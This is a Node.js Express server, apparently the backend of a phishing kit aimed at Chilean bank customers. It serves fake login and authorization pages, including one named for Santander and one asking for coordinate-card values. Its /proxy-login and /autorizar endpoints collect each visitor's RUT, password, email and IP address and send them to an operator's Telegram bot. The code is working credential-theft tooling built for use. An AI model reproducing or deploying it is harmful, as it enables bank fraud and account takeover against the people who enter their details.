const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
// Eliminado Puppeteer: flujo simplificado que acepta credenciales y responde inmediatamente
const fetch = require("node-fetch");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Helper seguro para enviar mensajes a Telegram sin romper la ejecución
async function safeSendTelegram(text) {
  if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
    console.warn('Telegram no configurado: TELEGRAM_TOKEN o CHAT_ID faltante');
    return;
  }
  try {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text })
    });
  } catch (err) {
    console.error('Error enviando a Telegram:', err);
  }
}

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
    res.json(cfg);
  } catch (err) {
    console.error('Error leyendo config.json:', err);
    res.status(500).json({ error: 'Error leyendo configuración' });
  }
});

// Endpoint para obtener coordenadas (usado por la UI)
app.get("/coordenadas", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
    const coordenadas = [cfg.coord1 || "", cfg.coord2 || "", cfg.coord3 || ""];
    res.json({ coordenadas });
  } catch (err) {
    console.error("Error leyendo config.json:", err);
    res.status(500).json({ error: "Error leyendo configuración" });
  }
});

// Endpoint para procesar saldo directamente (flujo original)
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  try {
    fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
    res.json(req.body);
  } catch (err) {
    console.error('Error guardando config.json:', err);
    res.status(500).json({ error: 'Error guardando configuración' });
  }
});

// Ruta directa al admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar
app.get("/autorizacion", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
    if (cfg.tipoAutorizacion === "santander") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
      return;
    }
    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
  } catch (err) {
    console.error('Error leyendo config.json en /autorizacion:', err);
    res.status(500).send('Error interno');
  }
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    await safeSendTelegram(mensaje);
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    console.error('Error en /autorizar:', err);
    res.status(500).json({ status: "error", error: String(err) });
  }
});

// Endpoint para login → flujo SIMPLE: notifica (Telegram opcional) y responde inmediatamente
app.post("/proxy-login", async (req, res) => {
  console.log('/proxy-login recibido');
  const { rut, passwd, mail } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  if (mail) {
    const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
    try {
      await safeSendTelegram(mensaje);
    } catch (err) {
      console.error('Error enviando correo actualizado a Telegram:', err);
    }
    return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
  }

  const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
  try {
    await safeSendTelegram(ingresoMsg);
  } catch (err) {
    console.error('Error enviando ingreso a Telegram:', err);
  }

  // Responder de inmediato al frontend
  return res.json({ status: "ok", mensaje: "Credenciales recibidas" });
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
